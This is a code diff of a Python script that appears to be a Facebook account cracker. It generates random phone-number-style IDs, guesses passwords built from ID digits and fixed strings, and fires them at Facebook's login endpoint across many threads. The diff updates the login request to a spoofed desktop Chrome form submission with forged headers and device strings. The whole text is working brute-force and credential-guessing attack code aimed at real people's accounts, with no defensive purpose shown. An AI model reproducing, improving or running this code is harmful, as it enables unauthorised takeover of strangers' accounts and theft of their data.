@@ -127,16 +127,16 @@ def main():
     for a in range(int(limit)):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
-    with ThreadPoolExecutor(max_workers=80) as Submits:
+    with ThreadPoolExecutor(max_workers=30) as Submits:
         os.system('clear')
         print(47*"\x1b[1;97m+") 
         for next in gen:
             ids = code + next
-            mk = ids[:6]
+            mk = ids[:8]
             xx = ids[:7]
-            v = ids[:8]
+            v = ids[:6]
             b = next[:6]  
-            passlist = [mk,xx,'57273200',v,'57575751','57575752']
+            passlist = [mk,xx,'57273200',v]
             Submits.submit(cracker,ids,passlist)
 
 def convert(cookie):
@@ -159,32 +159,52 @@ def cracker(ids,passlist):
             deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Xiaomi Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Xiaomi Redmi Note 9 Pro"])
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
-            url1 = "https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6a6bad29-cbdb-41c1-9670-3c76e00feb61%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr"                       
+            url1 = "https://free.facebook.com/n"                       
             requu1 = session.get(url1)
-            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            head = {'Host': 'm.facebook.com',
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-length': f"{len(str(log_data))}",
+            log_data = {
+            "email": ids,
+            "cuid": "",
+            "guid": "f2ba818b08f46eb79",
+            "lgnjs": "1738826116",
+            "lgnrnd": "231516_Q1MP",
+            "locale": "en_GB",
+            "login_source": "comet_login_header",
+            "next": "https://web.facebook.com/legal/internet.org_fbsterms?_rdc=1&_rdr#",
+            "skstamp": "",
+            "timezone": "-360",
+            "prefill_contact_point": "",
+            "prefill_source": "",
+            "lsd": re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
+            "lgndim": '{"w":1920,"h":1080,"aw":1920,"ah":1040,"c":24}',
+            "ab_test_data": "AAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAA/k/SJAAAAAABFAB",
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
+            url = "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1"
+            head = {
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
+            'Accept-Encoding': 'gzip, deflate',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Connection': 'keep-alive',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6a6bad29-cbdb-41c1-9670-3c76e00feb61%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D961869d97c54d27debcf08510cb8a60ff00415d48597f2b7%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-            'sec-ch-ua-mobile': '?1',
+            'dpr': '1',
+            'origin': 'https://web.facebook.com',
+            'priority': 'u=0, i',
+            'referer': 'https://web.facebook.com/legal/internet.org_fbsterms?_rdc=1&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
+            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.160", "Google Chrome";v="132.0.6834.160"',
+            'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
-            'user-agent': us,
-            'x-asbd-id': '129477',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream',}                        
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'viewport-width': '1920'}                       
             response = session.post(url,headers=head,data=log_data,allow_redirects=False) #proxies=proxs)
             #print(headers)
             log_cookies = session.cookies.get_dict().keys()
